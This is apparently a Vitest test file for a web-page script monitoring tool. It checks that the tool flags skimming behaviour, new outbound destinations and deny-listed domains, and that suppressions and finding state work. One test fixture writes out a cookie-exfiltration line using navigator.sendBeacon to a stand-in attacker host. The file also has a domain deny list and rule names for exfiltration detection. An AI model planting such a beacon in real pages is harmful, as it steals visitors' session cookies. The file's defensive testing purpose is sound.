import { describe, expect, it } from 'vitest';
import { analyzeJavaScript } from '../../src/analysis/ast-analyzer.js';
import { evaluateDomain } from '../../src/analysis/domain-analyzer.js';
import { analyzeResources } from '../../src/analysis/script-analysis.js';
import { createBaseline } from '../../src/baseline/baseline-manager.js';
import { compareSite } from '../../src/monitoring/comparison-engine.js';
import { annotateFindings, trackFindings, type FindingState } from '../../src/monitoring/dedup-state.js';
import { buildFindings } from '../../src/monitoring/finding-engine.js';
import { applySuppressions } from '../../src/monitoring/suppressions.js';
import { parseConfigText } from '../../src/config/loader.js';
import type { ScriptResource } from '../../src/types/index.js';
import { destination, scriptResource, site } from '../fixtures/builders.js';
import { BENIGN_ANALYTICS, SKIMMER } from '../fixtures/scripts.js';

const URL_A = 'https://cdn.vendor.example/widget.js';
const cfg = { rules: {}, analysis: { enabled: true, maxScriptBytes: 3 * 1024 * 1024 } };

function analyzed(url: string, source: string, overrides: Partial<ScriptResource> = {}): ScriptResource {
  const r = scriptResource(url, source, overrides);
  analyzeResources([r], new Map([[r.hashes.sha256 as string, Buffer.from(source)]]), cfg);
  return r;
}

describe('behaviour-aware findings', () => {
  it('escalates an update that introduces skimming behaviour', () => {
    const before = analyzed(URL_A, 'window.Widget = { init: function () {} };');
    const after = analyzed(URL_A, `window.Widget = { init: function () {} };\n${SKIMMER}`);
    const base = createBaseline(site([before]), { scanId: 's1' });
    expect(base.resources[0]?.indicators).toEqual({});
    const s = site([after]);
    const [finding] = buildFindings(compareSite(s, base).changes, { site: s });
    expect(finding?.kind).toBe('resource-modified');
    expect(finding?.signals.map((x) => x.id)).toEqual(expect.arrayContaining(['new-rule:TS-SENSITIVE-FIELD-ACCESS', 'new-rule:TS-EXFIL-COMBINATION']));
    expect(['high', 'critical']).toContain(finding?.severity);
    expect(finding?.category).toBe('high-priority');
    expect(finding?.evidence.some((e) => e.label.startsWith('TS-SENSITIVE-FIELD-ACCESS at line'))).toBe(true);
  });

  it('does not escalate a routine update of an analytics script whose behaviour is unchanged', () => {
    const before = analyzed(URL_A, BENIGN_ANALYTICS);
    const after = analyzed(URL_A, BENIGN_ANALYTICS.replace("'pageview'", "'page_view'"));
    const base = createBaseline(site([before]), { scanId: 's1' });
    expect(base.resources[0]?.indicators?.['TS-COOKIE-ACCESS']).toBeGreaterThan(0);
    const s = site([after]);
    const [finding] = buildFindings(compareSite(s, base).changes, { site: s });
    expect(finding?.signals.filter((x) => x.id.includes('rule:'))).toEqual([]);
    expect(finding?.category).toBe('review');
  });

  it('flags a changed script that references the new outbound destination', () => {
    const before = analyzed(URL_A, 'fetch("https://api.vendor.example/v1")');
    const after = analyzed(URL_A, 'fetch("https://api.vendor.example/v1"); navigator.sendBeacon("https://drop.attacker.example/c", document.cookie)');
    const base = createBaseline(site([before]), { scanId: 's1' });
    const s = site([after], { destinations: [destination('cdn.vendor.example'), destination('drop.attacker.example', { methods: ['POST'], resourceTypes: ['ping'] })] });
    const findings = buildFindings(compareSite(s, base).changes, { site: s });
    const modified = findings.find((f) => f.kind === 'resource-modified');
    expect(modified?.signals.map((x) => x.id)).toContain('script-references-new-destination');
    expect(modified?.evidence.find((e) => e.label === 'References new destination')?.value).toContain('drop.attacker.example');
  });

  it('honours per-rule configuration', () => {
    const before = analyzed(URL_A, 'a()');
    const after = analyzed(URL_A, 'a(); eval(x)');
    const base = createBaseline(site([before]), { scanId: 's1' });
    const s = site([after]);
    const changes = compareSite(s, base).changes;
    const strong = buildFindings(changes, { site: s, rules: { 'TS-EVAL': { enabled: true, weight: 60, ignoreResources: [] } } });
    expect(strong[0]?.score).toBeGreaterThanOrEqual(80);
    const off = analyzeJavaScript('eval(x)', { rules: [] });
    expect(off.counts).toEqual({});
  });
});

describe('domain policy', () => {
  it('evaluates allow, deny, suspicious and IP literals', () => {
    const policy = { allow: ['*.trusted.example'], deny: ['evil.example'], suspicious: ['*.top'] };
    expect(evaluateDomain('cdn.trusted.example', 'trusted.example', policy).allowed).toBe(true);
    expect(evaluateDomain('x.evil.example', 'evil.example', policy).denied).toBe(true);
    expect(evaluateDomain('a.cheap.top', 'cheap.top', policy).suspicious).toBe(true);
    expect(evaluateDomain('203.0.114.7', undefined, policy).ipLiteral).toBe(true);
  });

  it('suppresses "new domain" for allowlisted domains and always reports denylisted ones', () => {
    const base = createBaseline(site([scriptResource('https://cdn.evil.example/a.js', 'a()')]), { scanId: 's1' });
    const s = site([scriptResource('https://cdn.evil.example/a.js', 'a()'), scriptResource('https://cdn.trusted.example/t.js', 't()')]);
    const changes = compareSite(s, base, { allow: ['trusted.example'], deny: ['evil.example'], suspicious: [] }).changes;
    expect(changes.filter((c) => c.kind === 'new-script-domain')).toEqual([]);
    const denied = changes.find((c) => c.kind === 'denylisted-domain');
    expect(denied?.host).toBe('cdn.evil.example');
    const findings = buildFindings(changes, { site: s });
    expect(findings.find((f) => f.kind === 'denylisted-domain')?.severity).toBe('critical');
  });
});

describe('suppressions and finding state', () => {
  function sampleFindings() {
    const before = analyzed(URL_A, 'a()');
    const after = analyzed(URL_A, 'a(); eval(x); document.cookie');
    const base = createBaseline(site([before]), { scanId: 's1' });
    const s = site([after]);
    return buildFindings(compareSite(s, base).changes, { site: s });
  }

  it('requires a documented reason in configuration', () => {
    const text = `sites: [{ name: a, url: 'https://a.example' }]\nsuppressions:\n  - rule: TS-EVAL\n`;
    expect(() => parseConfigText(text, 'x.yml')).toThrow(/reason/);
    expect(() => parseConfigText(`sites: [{ name: a, url: 'https://a.example' }]\nsuppressions:\n  - reason: no matcher\n`, 'x.yml')).toThrow(/at least one/);
    expect(() => parseConfigText(`sites: [{ name: a, url: 'https://a.example' }]\nrules:\n  TS-NOPE: { enabled: false }\n`, 'x.yml')).toThrow(/unknown rule/);
  });

  it('a rule suppression removes only that rule\'s contribution', () => {
    const findings = sampleFindings();
    const before = findings[0];
    const { findings: out, applied } = applySuppressions(findings, [{ rule: 'TS-EVAL', reason: 'vendor uses eval for templates', resource: 'https://cdn.vendor.example/*' }]);
    expect(applied).toBe(1);
    expect(out[0]?.suppressed).toBeUndefined();
    expect(out[0]?.signals.some((s) => s.id === 'new-rule:TS-EVAL')).toBe(false);
    expect(out[0]?.signals.some((s) => s.id === 'new-rule:TS-COOKIE-ACCESS')).toBe(true);
    expect(out[0]?.score).toBeLessThan(before?.score ?? 0);
  });

  it('an id suppression marks the finding as suppressed but keeps it in the report', () => {
    const findings = sampleFindings();
    const id = findings[0]?.id as string;
    const { findings: out } = applySuppressions(findings, [{ id, reason: 'accepted risk, ticket SEC-12' }]);
    expect(out[0]?.suppressed?.reason).toBe('accepted risk, ticket SEC-12');
  });

  it('ignores expired suppressions and reports them', () => {
    const findings = sampleFindings();
    const id = findings[0]?.id as string;
    const { findings: out, expired } = applySuppressions(findings, [{ id, reason: 'temporary', expires: '2020-01-01' }], { now: new Date('2026-01-01') });
    expect(out[0]?.suppressed).toBeUndefined();
    expect(expired).toHaveLength(1);
  });

  it('tracks new versus recurring findings', () => {
    const state: FindingState = { version: 1, findings: {} };
    const first = sampleFindings();
    trackFindings(first, state, new Date('2026-01-01'));
    expect(first[0]?.status).toBe('new');
    const second = sampleFindings();
    trackFindings(second, state, new Date('2026-01-02'));
    expect(second[0]?.status).toBe('recurring');
    expect(state.findings[second[0]?.id as string]?.timesSeen).toBe(2);
    const readOnly = sampleFindings();
    annotateFindings(readOnly, state);
    expect(readOnly[0]?.status).toBe('recurring');
  });

  it('forgets findings not seen for a long time', () => {
    const state: FindingState = { version: 1, findings: { 'TS-000000000000': { firstSeen: '2020-01-01T00:00:00Z', lastSeen: '2020-01-01T00:00:00Z', timesSeen: 1, severity: 'low' } } };
    trackFindings([], state, new Date('2026-01-01'));
    expect(state.findings).toEqual({});
  });
});
